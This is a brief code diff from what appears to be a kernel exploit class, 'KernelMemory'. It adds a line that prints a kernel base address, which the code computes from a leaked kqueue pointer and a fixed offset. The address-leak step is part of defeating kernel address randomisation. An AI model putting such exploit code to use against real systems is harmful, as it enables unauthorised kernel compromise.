@@ -535,7 +535,8 @@ public class KernelMemory {
 
 	long kqueue_addr = leak_kqueue();
 	kernel_base = (kqueue_addr & ~0xFFFF) - 0x310000;
-
+	println("[+] Kernel base: 0x" + Long.toHexString(kernel_base));
+	
 	println("[*] Cleaning up...");
 	cleanup();
     }
